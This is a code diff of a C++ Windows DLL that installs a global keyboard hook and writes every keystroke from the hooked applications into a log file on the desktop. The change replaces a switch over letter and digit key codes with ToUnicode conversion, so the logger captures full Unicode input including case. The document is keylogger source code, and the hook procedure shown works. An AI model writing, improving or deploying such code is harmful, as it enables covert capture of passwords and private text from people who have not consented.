@@ -6,7 +6,8 @@
 #include <KnownFolders.h>
 #include <shlwapi.h> // Using PathCombine
 
-
+#include <iostream>
+#include <bitset>
 // Buffer to store the desktop folder path
 PWSTR desktopPath = nullptr;
 wchar_t filePath[MAX_PATH];
@@ -18,59 +19,27 @@ HHOOK global;
 extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 
-		std::ofstream LogFile;
+		std::wofstream LogFile;
 		// Note: this should be an absolute path to make sure each instance 
 		// of the DLL loaded by different applications log to the same file
 		LogFile.open(filePath, std::ios_base::app);
 
-		//check key up flag not set
+		// check key up flag not set
 		if (!(HIWORD(lParam) & KF_UP)) {
-			switch (wParam) {
 
-				// Check for a complete list of virtual key codes:
-				// https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
+			// Get the keyboard state			
+			BYTE keyboardState[256];
+			GetKeyboardState(keyboardState);
+			// Note: using this can give the wrong caps when the hook and target application have different architectures:
+			// => in this case, this code is executed in the installer, not in the hooked application
+			// but GetKeyboardState is application specific
 
-				// Number keys
-			case 0x30: LogFile << "0"; break;
-			case 0x31: LogFile << "1"; break;
-			case 0x32: LogFile << "2"; break;
-			case 0x33: LogFile << "3"; break;
-			case 0x34: LogFile << "4"; break;
-			case 0x35: LogFile << "5"; break;
-			case 0x36: LogFile << "6"; break;
-			case 0x37: LogFile << "7"; break;
-			case 0x38: LogFile << "8"; break;
-			case 0x39: LogFile << "9"; break;
+			// Buffer to store the resulting Unicode character
+			WCHAR buffer[2];
 
-				// Letter keys
-			case 0x41: LogFile << "a"; break;
-			case 0x42: LogFile << "b"; break;
-			case 0x43: LogFile << "c"; break;
-			case 0x44: LogFile << "d"; break;
-			case 0x45: LogFile << "e"; break;
-			case 0x46: LogFile << "f"; break;
-			case 0x47: LogFile << "g"; break;
-			case 0x48: LogFile << "h"; break;
-			case 0x49: LogFile << "i"; break;
-			case 0x4A: LogFile << "j"; break;
-			case 0x4B: LogFile << "k"; break;
-			case 0x4C: LogFile << "l"; break;
-			case 0x4D: LogFile << "m"; break;
-			case 0x4E: LogFile << "n"; break;
-			case 0x4F: LogFile << "o"; break;
-			case 0x50: LogFile << "p"; break;
-			case 0x51: LogFile << "q"; break;
-			case 0x52: LogFile << "r"; break;
-			case 0x53: LogFile << "s"; break;
-			case 0x54: LogFile << "t"; break;
-			case 0x55: LogFile << "u"; break;
-			case 0x56: LogFile << "v"; break;
-			case 0x57: LogFile << "w"; break;
-			case 0x58: LogFile << "x"; break;
-			case 0x59: LogFile << "y"; break;
-			case 0x5A: LogFile << "z"; break;
-
-			}
+			// Convert the virtual key code to Unicode
+			int result = ToUnicode(wParam, MapVirtualKey(wParam, MAPVK_VK_TO_VSC), keyboardState, buffer, 2, 0);
+			LogFile << buffer;
 		}
 
 		// Close the file
